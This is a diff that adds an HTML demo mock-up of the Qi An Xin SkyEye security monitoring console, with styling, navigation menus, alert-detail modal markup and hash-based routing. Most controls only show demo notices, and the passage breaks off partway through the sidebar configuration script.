@@ -1,0 +1,1078 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>奇安信天眼 SkYeye 安全检测平台</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cpath d='M16 3l11 13-11 13L5 16z' fill='%230B62B8'/%3E%3Cpath d='M16 9l6 7-6 7-6-7z' fill='%23fff'/%3E%3C/svg%3E">
+<script src="https://cdn.jsdelivr.net/npm/echarts@5.5.0/dist/echarts.min.js"></script>
+<style>
+/* ============ 基础 ============ */
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%}
+body{font-family:"Microsoft YaHei","PingFang SC",Helvetica,Arial,sans-serif;font-size:13px;color:#333;background:#F0F3F8;overflow:hidden}
+a{color:#0B66C7;text-decoration:none;cursor:pointer}
+.mono{font-family:Consolas,Menlo,Monaco,monospace}
+::-webkit-scrollbar{width:8px;height:8px}
+::-webkit-scrollbar-thumb{background:#c8d2e0;border-radius:4px}
+::-webkit-scrollbar-track{background:transparent}
+button{font-family:inherit;cursor:pointer}
+input,select{font-family:inherit;font-size:13px;outline:none}
+
+/* ============ 顶部导航 ============ */
+#topbar{height:52px;background:linear-gradient(90deg,#0A5BAE 0%,#0B62B8 55%,#1880D8 100%);display:flex;align-items:center;color:#fff;position:relative;z-index:100;box-shadow:0 1px 4px rgba(0,0,0,.15)}
+.logo{display:flex;align-items:center;gap:8px;padding:0 14px 0 16px;height:52px;cursor:pointer}
+.logo svg{width:30px;height:30px}
+.logo span{font-size:18px;font-weight:700;letter-spacing:1px}
+.hamburger{width:44px;height:52px;display:flex;align-items:center;justify-content:center;cursor:pointer;border-left:1px solid rgba(255,255,255,.15)}
+.hamburger span{display:block;width:18px;height:2px;background:#fff;position:relative}
+.hamburger span::before{content:"";position:absolute;top:-6px;left:0;width:18px;height:2px;background:#fff}
+.hamburger span::after{content:"";position:absolute;top:6px;left:0;width:18px;height:2px;background:#fff}
+.topnav{display:flex;height:52px;align-items:stretch}
+.topnav .tn-item{padding:0 18px;display:flex;align-items:center;font-size:14px;color:rgba(255,255,255,.92);cursor:pointer;position:relative;white-space:nowrap}
+.topnav .tn-item:hover{background:rgba(255,255,255,.12)}
+.topnav .tn-item.active{background:#0F89F0}
+.topright{margin-left:auto;display:flex;align-items:center;gap:16px;padding-right:18px;height:52px}
+.topright .tr{display:flex;align-items:center;gap:5px;cursor:pointer;font-size:12px;color:rgba(255,255,255,.95);position:relative}
+.topright .dot{width:7px;height:7px;border-radius:50%;background:#ff4d4f;position:absolute;top:-2px;right:-6px}
+.topright .mail-badge{background:#F5443D;border-radius:9px;font-size:11px;padding:0 6px;line-height:16px;height:16px}
+.tr svg{width:18px;height:18px;fill:#fff}
+
+/* ============ 全局 mega menu ============ */
+#megamenu{position:fixed;top:52px;left:0;right:0;background:rgba(13,38,72,.97);color:#cfe3f7;display:none;z-index:99;box-shadow:0 8px 24px rgba(0,0,0,.3);padding:18px 28px;grid-template-columns:repeat(9,1fr);gap:6px 18px;max-height:78vh;overflow:auto}
+#megamenu.open{display:grid}
+.mm-col h4{font-size:14px;color:#fff;font-weight:600;padding:6px 0 10px;border-bottom:1px solid rgba(255,255,255,.18);margin-bottom:8px;position:relative}
+.mm-col h4::before{content:"";position:absolute;left:0;bottom:-1px;width:26px;height:2px;background:#2EA8FF}
+.mm-col .mm-group-title{font-size:12.5px;color:#7fb8ee;margin:8px 0 3px;cursor:pointer}
+.mm-col a{display:block;font-size:12.5px;color:#b8d4f0;padding:3px 0 3px 12px;cursor:pointer;line-height:1.5}
+.mm-col a::before{content:"·";color:#2EA8FF;margin-right:5px}
+.mm-col a:hover{color:#fff;background:rgba(46,168,255,.15)}
+
+/* ============ 布局 ============ */
+#layout{display:flex;height:calc(100vh - 52px - 26px)}
+#sidebar{width:196px;flex:0 0 196px;background:linear-gradient(180deg,#0B5AA8 0%,#0E79C4 60%,#1296DB 100%);color:#fff;overflow-y:auto;padding-bottom:20px}
+#main{flex:1;display:flex;flex-direction:column;overflow:hidden}
+#crumb{height:40px;background:#fff;display:flex;align-items:center;padding:0 18px;font-size:12.5px;color:#666;box-shadow:0 1px 2px rgba(0,0,0,.04);gap:6px}
+#crumb .sep{color:#bbb}
+#crumb .cur{color:#333}
+#crumb .right-tools{margin-left:auto;display:flex;align-items:center;gap:10px}
+#view{flex:1;overflow-y:auto;padding:14px 16px 30px;position:relative}
+
+/* ============ 侧栏菜单 ============ */
+.side-item{display:flex;align-items:center;gap:8px;padding:0 14px;height:42px;font-size:14px;cursor:pointer;color:rgba(255,255,255,.92);white-space:nowrap}
+.side-item:hover{background:rgba(255,255,255,.1)}
+.side-item.active{background:#0F89F0;border-radius:6px;margin:0 8px;padding:0 10px;height:38px}
+.side-item .arr{margin-left:auto;font-size:10px;transition:transform .2s}
+.side-item.open .arr{transform:rotate(180deg)}
+.side-item svg{width:16px;height:16px;fill:#cfe6ff;flex:0 0 16px}
+.side-item img{flex:0 0 auto;align-self:center}
+.side-sub{overflow:hidden}
+.side-sub .sub-item{display:block;padding:0 14px 0 38px;height:36px;line-height:36px;font-size:13px;color:rgba(255,255,255,.82);cursor:pointer;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.side-sub .sub-item::before{content:"·";margin-right:6px;color:#9fd0ff}
+.side-sub .sub-item:hover{color:#fff}
+.side-sub .sub-item.active{color:#fff;background:rgba(255,255,255,.14);border-radius:0 4px 4px 0}
+
+/* ============ 通用组件 ============ */
+.card{background:#fff;border-radius:4px;box-shadow:0 1px 3px rgba(31,56,88,.06);margin-bottom:14px}
+.card-title{padding:12px 16px;font-size:14px;font-weight:600;color:#333;border-bottom:1px solid #eef1f6;display:flex;align-items:center}
+.card-title .tools{margin-left:auto;display:flex;gap:10px}
+.card-body{padding:14px 16px}
+.btn{display:inline-flex;align-items:center;gap:5px;border:none;border-radius:3px;font-size:13px;padding:0 14px;height:32px;background:#0B66C7;color:#fff}
+.btn:hover{background:#0d74dd}
+.btn.plain{background:#fff;color:#555;border:1px solid #d9dee6}
+.btn.plain:hover{border-color:#0B66C7;color:#0B66C7}
+.btn.danger{background:#F5443D}
+.btn.sm{height:28px;padding:0 10px;font-size:12px}
+.query-row{display:flex;flex-wrap:wrap;align-items:center;gap:14px 22px;padding:14px 16px;background:#fff;border-radius:4px;margin-bottom:14px}
+.q-item{display:flex;align-items:center;gap:8px}
+.q-item label{color:#666;white-space:nowrap}
+.q-item input,.q-item select{height:30px;border:1px solid #d4dae3;border-radius:3px;padding:0 8px;background:#fff;min-width:150px}
+.q-item input::placeholder{color:#9aa5b3}
+.tag{display:inline-block;padding:1px 9px;border-radius:3px;font-size:12px;line-height:18px}
+.tag-urgent{background:#FDE8E6;color:#F5443D;border:1px solid #F5443D}
+.tag-high{background:#FFF4E0;color:#D97A06;border:1px solid #F59E0B}
+.tag-mid{background:#FFF7E0;color:#B98200;border:1px solid #F5A623}
+.tag-low{background:#E8F1FD;color:#2E7BD6;border:1px solid #4A90E2}
+.tag-attempt{background:#FFF3CD;color:#8a6d00;border:1px solid #e8c96a}
+.tag-fail{background:#2E7BD6;color:#fff;border:1px solid #2E7BD6}
+.tag-info{background:#E8F1FD;color:#2E7BD6}
+.tag-blue-solid{background:#2E7BD6;color:#fff}
+
+/* 表格 */
+.tbl-wrap{background:#fff;border-radius:4px}
+table.tbl{width:100%;border-collapse:collapse;table-layout:fixed}
+table.tbl th{background:#F4F6F9;color:#555;font-weight:600;font-size:12.5px;padding:10px 8px;text-align:left;border-bottom:1px solid #e6ebf2;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+table.tbl td{padding:9px 8px;font-size:12.5px;border-bottom:1px solid #eef1f6;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:#444}
+table.tbl tbody tr:hover{background:#F0F7FF}
+table.tbl .ip{font-family:Consolas,Menlo,Monaco,monospace;font-size:12px}
+.link{color:#2E7BD6;cursor:pointer}
+.ops a{margin-right:10px;cursor:pointer;color:#2E7BD6;white-space:nowrap}
+.empty{text-align:center;color:#9aa5b3;padding:36px 0;font-size:13px}
+.empty .ico{width:90px;height:70px;margin:0 auto 10px;opacity:.5}
+
+/* 分页 */
+.pager{display:flex;align-items:center;justify-content:flex-end;gap:8px;padding:12px 16px;font-size:12.5px;color:#666}
+.pager select{height:28px;border:1px solid #d4dae3;border-radius:3px}
+.pg-btn{min-width:28px;height:28px;border:1px solid #d9dee6;background:#fff;border-radius:3px;cursor:pointer;color:#555;padding:0 6px}
+.pg-btn.on{background:#0B66C7;color:#fff;border-color:#0B66C7}
+.pg-btn:disabled{cursor:not-allowed;opacity:.5}
+.pager .jump input{width:44px;height:28px;border:1px solid #d4dae3;border-radius:3px;text-align:center}
+
+/* 统计条 */
+.stat-bar{display:flex;align-items:center;gap:26px;padding:10px 16px;background:#fff;border-radius:4px;margin-bottom:12px;font-size:12.5px;color:#666}
+.stat-bar b{font-size:14px;color:#333}
+.stat-bar .st{display:flex;align-items:center;gap:6px}
+.st-ico{width:15px;height:15px;border-radius:50%;display:inline-block}
+
+/* 标签页 */
+.tabs{display:flex;border-bottom:1px solid #e6ebf2;background:#fff;padding:0 16px;gap:4px}
+.tab{padding:0 16px;height:42px;line-height:42px;cursor:pointer;font-size:13px;color:#555;border-bottom:2px solid transparent;white-space:nowrap}
+.tab.active{color:#0B66C7;border-bottom-color:#0B66C7;font-weight:600}
+.tab .lv{font-size:10px;background:#0B66C7;color:#fff;border-radius:3px;padding:0 5px;line-height:15px;height:15px;display:inline-block;margin-left:4px;vertical-align:2px}
+
+/* 详情弹窗 */
+#modalMask{position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:200;display:none}
+#modalMask.open{display:block}
+#alertDetail{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:72%;max-height:88vh;background:#fff;border-radius:6px;z-index:201;display:none;flex-direction:column;box-shadow:0 12px 40px rgba(0,0,0,.25)}
+#alertDetail.open{display:flex}
+.ad-head{display:flex;justify-content:flex-end;gap:10px;padding:12px 16px;border-bottom:1px solid #eef1f6}
+.ad-body{overflow-y:auto;padding:8px 24px 20px}
+.ad-section{margin-top:16px}
+.ad-section h5{font-size:14px;color:#0B66C7;padding-left:10px;border-left:3px solid #0B66C7;margin-bottom:10px}
+.ad-grid{display:grid;grid-template-columns:1fr 1fr;border:1px solid #e6ebf2;border-radius:4px;overflow:hidden}
+.ad-grid .cell{display:flex;border-bottom:1px solid #eef1f6;font-size:12.5px}
+.ad-grid .cell:nth-last-child(-n+2){border-bottom:none}
+.ad-grid .cell:nth-child(odd){border-right:1px solid #eef1f6}
+.ad-grid .k{width:110px;flex:0 0 110px;background:#F8FAFC;padding:9px 12px;color:#666}
+.ad-grid .v{flex:1;padding:9px 12px;color:#333}
+.ad-code{background:#1e2a3a;color:#d8e6f5;border-radius:4px;padding:14px 16px;font-family:Consolas,Menlo,Monaco,monospace;font-size:12px;line-height:1.9;white-space:pre-wrap;word-break:break-all}
+
+/* 客服浮窗 & 页脚 */
+#chat{position:fixed;right:22px;bottom:46px;width:48px;height:48px;border-radius:50%;background:#0B66C7;color:#fff;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 4px 12px rgba(11,102,199,.4);z-index:90}
+#chat svg{width:22px;height:22px;fill:#fff}
+footer{height:26px;background:#fff;display:flex;align-items:center;justify-content:center;font-size:11px;color:#9aa5b3;border-top:1px solid #eef1f6}
+#toast{position:fixed;top:70px;left:50%;transform:translateX(-50%);background:rgba(20,30,48,.92);color:#fff;padding:9px 22px;border-radius:4px;font-size:13px;z-index:300;display:none}
+
+/* ============ 仪表板 ============ */
+.stat-cards{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:14px}
+.g-card{height:110px;border-radius:6px;padding:14px 18px;color:#fff;position:relative;overflow:hidden}
+.g-card .gc-label{font-size:13px;opacity:.9}
+.g-card .gc-main{font-size:30px;font-weight:700;margin-top:8px}
+.g-card .gc-sub{font-size:12px;margin-top:4px;opacity:.9}
+.g-card .gc-ico{position:absolute;right:14px;top:24px;height:54px;width:auto;max-width:64px;opacity:.9;object-fit:contain}
+.gc-1{background:linear-gradient(120deg,#5B8DEF,#7FA8F5)}
+.gc-2{background:linear-gradient(120deg,#7B7BE8,#9C8FF0)}
+.gc-3{background:linear-gradient(120deg,#1FB6A6,#3CC9B8)}
+.gc-4{background:linear-gradient(120deg,#3F8CE8,#5FA8F0)}
+.row2{display:grid;grid-template-columns:1fr 1fr 1.6fr;gap:14px;margin-bottom:14px}
+.mini2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.mini-cell{text-align:center;padding:12px;border-radius:6px;background:#F8FAFD}
+.mini-cell .mc-ico{width:34px;height:34px;margin:0 auto 6px;display:flex;align-items:center;justify-content:center}
+.mini-cell .mc-ico svg{width:18px;height:18px}
+.mini-cell b{font-size:22px;color:#333}
+.mini-cell .mc-sub{font-size:11.5px;color:#8a94a3;margin-top:3px}
+.ring-wrap{display:flex;align-items:center;gap:14px}
+.ring-legend{flex:1;font-size:12px}
+.ring-legend .rl{display:flex;align-items:center;gap:6px;padding:2.5px 0;color:#555}
+.ring-legend .rl i{width:10px;height:10px;border-radius:2px;flex:0 0 10px}
+.ring-legend .rl span{margin-left:auto;color:#8a94a3}
+.huanbi{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:8px 4px}
+.huanbi .hb{padding:10px 14px}
+.huanbi .hb .t{color:#8a94a3;font-size:12px;display:flex;align-items:center;gap:8px}
+.huanbi .hb .v{font-size:26px;font-weight:700;color:#0B66C7;margin-top:8px}
+.huanbi .hb .v small{font-size:13px;color:#8a94a3;font-weight:400;margin-left:4px}
+.huanbi .up{color:#3CB96A;font-size:12px}
+
+/* ============ 系统监控拓扑 ============ */
+#topoBox{background:#fff;border-radius:4px;padding:10px;overflow:hidden}
+#topoSvg{width:100%;height:640px}
+.topo-legend{position:absolute;top:20px;right:24px;background:rgba(255,255,255,.92);border:1px solid #e0e6ee;border-radius:4px;padding:10px 14px;font-size:12px;color:#555;display:grid;grid-template-columns:1fr 1fr;gap:5px 18px;z-index:5}
+
+/* ============ 工作台 ============ */
+.focus-cards{display:grid;grid-template-columns:repeat(8,1fr);gap:10px;background:#fff;border-radius:4px;padding:12px 14px;margin-bottom:14px}
+.fc{position:relative;background:linear-gradient(180deg,#F4F9FF,#EAF3FE);border-radius:4px;padding:10px 12px;height:64px;cursor:pointer}
+.fc .n{font-size:12px;color:#666}
+.fc .v{font-size:24px;font-weight:700;color:#333;margin-top:2px}
+.fc .v small{font-size:12px;color:#8a94a3;font-weight:400}
+.fc .badge{position:absolute;top:8px;right:8px;background:#F5443D;color:#fff;font-size:11px;border-radius:9px;min-width:18px;height:18px;line-height:18px;text-align:center;padding:0 4px}
+.split2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+
+/* ============ 态势大屏（深色） ============ */
+#view.situation-view{padding:0;background:#061225}
+.bigscreen{height:calc(100vh - 52px - 26px - 40px);background:radial-gradient(ellipse at 50% 30%,#0b2347 0%,#061225 70%);color:#cfe3f7;position:relative;overflow:hidden;display:flex;flex-direction:stretch}
+.bs-panel{background:linear-gradient(180deg,rgba(16,48,96,.55),rgba(8,26,56,.55));border:1px solid rgba(64,140,230,.35);position:relative;margin:10px}
+.bs-panel::before,.bs-panel::after{content:"";position:absolute;width:14px;height:14px;border-color:#2EA8FF;border-style:solid}
+.bs-panel::before{top:-1px;left:-1px;border-width:2px 0 0 2px}
+.bs-panel::after{bottom:-1px;right:-1px;border-width:0 2px 2px 0}
+.bs-panel h6{font-size:13px;color:#8fd0ff;padding:8px 12px;display:flex;align-items:center;gap:6px;border-bottom:1px solid rgba(64,140,230,.25)}
+.bs-panel h6::before{content:"";width:4px;height:12px;background:#2EA8FF}
+.bs-left{width:250px;flex:0 0 250px;display:flex;flex-direction:column;gap:10px;padding:10px 0 10px 10px}
+.bs-right{width:270px;flex:0 0 270px;display:flex;flex-direction:column;gap:10px;padding:10px 10px 10px 0}
+.bs-center{flex:1;display:flex;flex-direction:column}
+.bs-head{height:56px;display:flex;align-items:center;justify-content:space-between;padding:0 20px;color:#8fd0ff;font-size:13px}
+.bs-head .bs-title{font-size:24px;font-weight:700;color:#fff;letter-spacing:6px;text-shadow:0 0 12px rgba(46,168,255,.8)}
+.bs-globe{flex:1;position:relative;min-height:0}
+.bs-bottom{height:170px;display:flex;gap:10px;padding:0 10px 10px}
+.bs-bottom .bs-panel{flex:1}
+.bs-stat-num{font-size:26px;font-weight:700;color:#fff;text-align:center}
+.bs-list{font-size:12px;padding:8px 12px}
+.bs-list .li{display:flex;justify-content:space-between;padding:4px 0;color:#a9c8e8}
+.bs-list .li b{color:#fff;font-weight:600}
+.apt-orbit{height:120px;position:relative;display:flex;align-items:center;justify-content:center}
+
+/* ============ 高级版 ============ */
+.info-banner{background:linear-gradient(90deg,#EAF3FE,#F5F9FF);border:1px solid #BFD9F5;border-radius:4px;padding:11px 16px;color:#3a6ea8;font-size:13px;display:flex;align-items:center;gap:8px;margin-bottom:14px}
+.flow-steps{display:grid;grid-template-columns:repeat(4,1fr);background:linear-gradient(180deg,#F0F6FF,#E8F1FD);border-radius:4px;padding:26px 30px;position:relative;margin-bottom:14px}
+.fstep{display:flex;flex-direction:column;align-items:center;gap:10px;position:relative}
+.fstep .circle{width:64px;height:64px;border-radius:50%;background:#fff;border:6px solid #BFD9F5;display:flex;align-items:center;justify-content:center}
+.fstep .circle svg{width:28px;height:28px;stroke:#2E7BD6;fill:none}
+.fstep .lbl{font-size:13px;color:#555}
+.fstep .arrow{position:absolute;right:-14px;top:26px;width:34px;height:10px;background:linear-gradient(90deg,#9CCBFF,#C8E2FF);clip-path:polygon(0 0,70% 0,70% 35%,100% 50%,70% 65%,70% 100%,0 100%)}
+.preview-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.preview-card .pv{height:280px;border-radius:4px;overflow:hidden;position:relative}
+.pv-earth{background:radial-gradient(circle at 50% 45%,#1456a8 0%,#0a2c5e 45%,#061225 100%)}
+.pv-cn{background:radial-gradient(circle at 55% 50%,#1a4a8a 0%,#0a2c5e 50%,#061225 100%)}
+.badge-ver{font-size:11px;border-radius:3px;padding:1px 8px;margin-left:8px;color:#fff}
+
+/* ============ 挖矿 ============ */
+.mining-banner{background:linear-gradient(90deg,#0B62B8,#2E9BEF);border-radius:4px;color:#fff;padding:16px 20px;display:flex;align-items:center;justify-content:space-around;margin-bottom:14px}
+.mstep{display:flex;align-items:center;gap:10px}
+.mstep .mi{width:44px;height:44px;border-radius:8px;background:rgba(255,255,255,.15);display:flex;align-items:center;justify-content:center}
+.mstep .mi svg{width:24px;height:24px;fill:#fff}
+.mstep .mt{font-size:12px;opacity:.9}
+.mstep .mv{font-size:20px;font-weight:700}
+.marrow{color:rgba(255,255,255,.6);font-size:18px}
+
+/* ============ 资产管理 ============ */
+.asset-layout{display:grid;grid-template-columns:280px 1fr;gap:14px;align-items:start}
+.tree-box{padding:12px}
+.tree-filter{width:100%;height:30px;border:1px solid #d4dae3;border-radius:3px;padding:0 8px;margin-bottom:10px}
+.tree-node{padding:5px 4px;font-size:13px;display:flex;align-items:center;gap:6px;cursor:pointer;color:#444}
+.tree-node:hover{background:#f0f6ff}
+.tag-new{font-size:10px;background:#0B66C7;color:#fff;border-radius:3px;padding:0 5px;line-height:15px;height:15px;display:inline-block;margin-left:6px}
+
+/* ============ 日志检索 ============ */
+.search-bar{display:flex;align-items:center;gap:10px;margin-bottom:14px}
+.idx-pop{position:relative}
+.idx-popup{position:absolute;top:36px;left:0;width:640px;background:#fff;border-radius:6px;box-shadow:0 8px 30px rgba(0,0,0,.15);padding:18px 24px;z-index:50;display:none}
+.idx-popup.open{display:block}
+.idx-group{margin-bottom:14px}
+.idx-group h6{font-size:13.5px;color:#0B66C7;margin-bottom:8px}
+.idx-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:7px 12px;font-size:12.5px;color:#555}
+.idx-grid label{display:flex;align-items:center;gap:5px;cursor:pointer}
+
+/* ============ 响应式 ============ */
+@media (max-width:1200px){
+  .stat-cards{grid-template-columns:repeat(2,1fr)}
+  .row2{grid-template-columns:1fr}
+  .focus-cards{grid-template-columns:repeat(4,1fr)}
+  .asset-layout{grid-template-columns:1fr}
+  .bs-left{width:200px;flex-basis:200px}
+  .bs-right{width:210px;flex-basis:210px}
+}
+</style>
+</head>
+<body>
+
+<!-- ===== 顶部栏 ===== -->
+<header id="topbar">
+  <div class="logo" onclick="location.hash='#/dashboard'">
+    <img src="assets/ty/ty-logo.png" alt="奇安信天眼" style="height:30px;cursor:pointer">
+  </div>
+  <div class="hamburger" title="收起菜单" onclick="toast('演示环境')"></div>
+  <nav class="topnav" id="topnav">
+    <div class="tn-item" data-sec="monitor" onclick="navTo('#/dashboard')">监测中心</div>
+    <div class="tn-item" data-sec="threat" onclick="navTo('#/alert-traffic')">威胁感知</div>
+    <div class="tn-item" data-sec="analysis" onclick="navTo('#/log-search')">分析中心</div>
+    <div class="tn-item" data-sec="resp" onclick="navTo('#/todo','响应处置')">响应处置</div>
+    <div class="tn-item" data-sec="asset" onclick="navTo('#/asset-manage')">资产感知</div>
+    <div class="tn-item" data-sec="report" onclick="navTo('#/report')">报表报告</div>
+    <div class="tn-item" data-sec="more" onclick="navTo('#/tools')">更多</div>
+    <div class="tn-item" id="tnMega" onmouseenter="openMega()" onclick="toggleMega()">全局导航</div>
+  </nav>
+  <div class="topright">
+    <div class="tr" onclick="toast('重保模式演示')"><img src="assets/ty/tb-repeat.png" style="height:20px;width:auto;vertical-align:middle"></div>
+    <div class="tr" onclick="toast('二维码')"><img src="assets/ty/tb-qrcode.png" style="height:20px;width:auto;vertical-align:middle"></div>
+    <div class="tr" onclick="toast('您有 99+ 条未读告警')"><img src="assets/ty/tb-mail.png" style="height:20px;width:auto;vertical-align:middle"><img src="assets/ty/tb-msg.png" style="height:16px;width:auto;margin-left:-8px;vertical-align:top"></div>
+    <div class="tr" onclick="toast('系统设置')"><img src="assets/ty/tb-setting.png" style="height:20px;width:auto;vertical-align:middle"></div>
+    <div class="tr" onclick="toast('管理员')"><img src="assets/ty/tb-user.png" style="height:20px;width:auto;vertical-align:middle"></div>
+  </div>
+</header>
+
+<!-- ===== 全局导航 mega menu ===== -->
+<div id="megamenu" onmouseleave="closeMega()"></div>
+
+<div id="layout">
+  <aside id="sidebar"></aside>
+  <main id="main">
+    <div id="crumb"></div>
+    <div id="view"></div>
+  </main>
+</div>
+
+<div id="chat" onclick="toast('客服小助手：演示环境，功能敬请期待')" title="客服">
+  <img src="assets/ty/float-service.png" style="width:44px;height:44px;border-radius:50%">
+</div>
+<footer>Copyright © 2005-2022 QIANXIN.COM All Rights Reserved 奇安信</footer>
+
+<!-- 告警详情弹窗 -->
+<div id="modalMask" onclick="closeDetail()"></div>
+<div id="alertDetail">
+  <div class="ad-head">
+    <button class="btn sm" onclick="toast('已开始下载 PCAP 包（演示）')">下载告警PCAP包</button>
+    <button class="btn sm" onclick="toast('已开始下载告警详情（演示）')">下载告警详情</button>
+    <button class="btn sm" onclick="toast('打开原始日志（演示）')">查看原始日志</button>
+    <button class="btn sm" onclick="toast('解码小助手（演示）')">解码小助手</button>
+    <button class="btn sm plain" onclick="closeDetail()">关闭</button>
+  </div>
+  <div class="ad-body" id="adBody"></div>
+</div>
+
+<div id="toast"></div>
+
+<script>
+/* ============ 全局工具 ============ */
+var _chartInstances = [];
+function toast(msg){var t=document.getElementById('toast');t.textContent=msg;t.style.display='block';clearTimeout(t._tm);t._tm=setTimeout(function(){t.style.display='none'},1800)}
+function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+function mkChart(el,opt){
+  if(!window.echarts||!el) return null;
+  var c=echarts.init(el);c.setOption(opt);_chartInstances.push(c);return c;
+}
+function disposeCharts(){_chartInstances.forEach(function(c){try{c.dispose()}catch(e){}});_chartInstances=[]}
+window.addEventListener('resize',function(){_chartInstances.forEach(function(c){try{c.resize()}catch(e){}})});
+
+/* ============ 菜单数据 ============ */
+var MEGA=[
+ {title:'监测中心',items:['仪表板|#/dashboard','系统运行监控|#/system-monitor','监测工作台|#/workbench','态势感知|#/situation','态势感知高级版|#/situation-pro']},
+ {title:'威胁感知',groups:[['告警列表',['流量传感器|#/alert-traffic','文件威胁鉴定器|#/alert-file','邮件威胁检测系统|#/alert-mail','攻击诱捕系统|#/alert-honeypot','智慧管理分析系统(SMAC)|#/alert-smac','服务器安全管理系统(云锁)|#/alert-yunsuo','SOAR自动化编排场景|#/alert-soar','全部|#/alert-all']],['威胁视角',['挖矿专项|#/mining','威胁情报|#/threat-intel']]]},
+ {title:'分析中心',groups:[['',['日志检索|#/log-search']],['行为分析',['DNS服务分析|#/todo:DNS服务分析','非常规服务分析|#/todo:非常规服务分析','邮件行为分析|#/todo:邮件行为分析','登录行为分析|#/todo:登录行为分析','WEB服务器行为分析|#/todo:WEB服务器行为分析','数据库行为分析|#/todo:数据库行为分析','访问行为分析|#/todo:访问行为分析','黑IP行为分析|#/todo:黑IP行为分析','旁路阻断行为分析|#/todo:旁路阻断行为分析','全包取证分析|#/todo:全包取证分析']]]},
+ {title:'响应处置',groups:[['处置编排',['工作流程|#/todo:工作流程','联动服务|#/todo:联动服务','任务脚本|#/todo:任务脚本','帮助文档|#/todo:帮助文档']],['策略管理',['策略定义|#/todo:策略定义','策略联动|#/todo:策略联动']],['',['处置记录|#/todo:处置记录','联动记录|#/todo:联动记录']]]},
+ {title:'资产感知',groups:[['资产',['资产管理|#/asset-manage','资产发现|#/todo:资产发现','资产互访|#/todo:资产互访','IP地址管理|#/todo:IP地址管理']],['',['脆弱性|#/todo:脆弱性','配置核查|#/todo:配置核查','补天漏洞|#/todo:补天漏洞']]]},
+ {title:'报表报告',items:['快速报表|#/report','周期报表|#/todo:周期报表','报表模板|#/todo:报表模板']},
+ {title:'重保',items:['重保模式|#/todo:重保模式','倒计时配置|#/todo:倒计时配置']},
+ {title:'更多',groups:[['安全服务',['服务记录|#/todo:服务记录','安全工具|#/tools']],['扩展程序',['扩展程序配置|#/todo:扩展程序配置','告警分析|#/todo:告警分析']],['',['第三方日志|#/todo:第三方日志']]]},
+ {title:'系统管理',groups:[['基础配置',['证书配置|#/todo:证书配置','网络配置|#/todo:网络配置','时间配置|#/todo:时间配置','升级配置|#/todo:升级配置','运营配置|#/todo:运营配置','系统运维|#/todo:系统运维']],['联动管理',['告警联动配置|#/todo:告警联动配置','处置联动配置|#/todo:处置联动配置','旁路阻断配置|#/todo:旁路阻断配置','账号管理|#/todo:账号管理']]]}
+];
+function openMega(){renderMega();document.getElementById('megamenu').classList.add('open')}
+function closeMega(){document.getElementById('megamenu').classList.remove('open')}
+function toggleMega(){document.getElementById('megamenu').classList.toggle('open')}
+var MM_TITLE_GO={'告警列表':'#/alert-traffic','威胁视角':'#/mining','行为分析':'#/log-search','资产':'#/asset-manage','安全服务':'#/tools'};
+function renderMega(){
+  var h='';
+  MEGA.forEach(function(col){
+    h+='<div class="mm-col"><h4>'+col.title+'</h4>';
+    if(col.items){col.items.forEach(function(it){var p=it.split('|');h+='<a onclick="navTo(\''+p[1]+'\')">'+p[0]+'</a>'})}
+    if(col.groups){col.groups.forEach(function(g){
+      if(g[0]){var gh=MM_TITLE_GO[g[0]];h+='<div class="mm-group-title" onclick="'+(gh?'navTo(\''+gh+'\')':'toast(\'演示页面，敬请期待\')')+'">'+g[0]+'</div>'}
+      g[1].forEach(function(it){var p=it.split('|');h+='<a onclick="navTo(\''+p[1]+'\')">'+p[0]+'</a>'});
+    })}
+    h+='</div>';
+  });
+  document.getElementById('megamenu').innerHTML=h;
+}
+/* ============ 路由与侧栏 ============ */
+var ROUTES={}; // 由各视图注册
+function navTo(hash){
+  closeMega();
+  if(hash.indexOf('#/todo')===0){toast('演示页面，敬请期待');return}
+  location.hash=hash;
+}
+function currentRoute(){return (location.hash||'#/dashboard').replace(/^#/,'')}
+
+/* 侧栏配置：section -> [{t:标题,icon,href,children:[...]}] */
+var SIDEBARS={
+ monitor:[
+  {t:'仪表板',href:'#/dashboard',icon:'menu-dashboard.png'},
+  {t:'系统运行监控',href:'#/system-monitor',icon:'menu-topology.png'},
+  {t:'监测工作台',href:'#/workbench',icon:'menu-workbench.png'},
+  {t:'态势感知',href:'#/situation',icon:'menu-situation.png'},
+  {t:'态势感知高级版',href:'#/situation-pro',icon:'menu-sitpro.png'}
+ ],
+ threat:[
+  {t:'告警列表',href:'#/alert-traffic',icon:'menu-alertlist.png',children:[
+    {t:'流量传感器',href:'#/alert-traffic'},{t:'文件威胁鉴定器',href:'#/alert-file'},
+    {t:'邮件威胁检测系统',href:'#/alert-mail'},{t:'攻击诱捕系统',href:'#/alert-honeypot'},
+    {t:'智慧管理分析系统(S…',href:'#/alert-smac'},{t:'服务器安全管理系统(…',href:'#/alert-yunsuo'},
+    {t:'SOAR自动化编排场景',href:'#/alert-soar'},{t:'全部',href:'#/alert-all'}]},
+  {t:'威胁视角',href:'#/mining',icon:'menu-threatview.png',children:[
+    {t:'挖矿专项',href:'#/mining'},{t:'威胁情报',href:'#/threat-intel'},{t:'应用安全',href:'#/todo:应用安全'},
+    {t:'系统安全',href:'#/todo:系统安全'},{t:'设备安全',href:'#/todo:设备安全'}]},
+  {t:'攻击者视角',href:'#/attacker-view',icon:'menu-attacker.png'},
+  {t:'资产视角',href:'#/asset-view',icon:'menu-assetview.png'}
+ ],
+ analysis:[
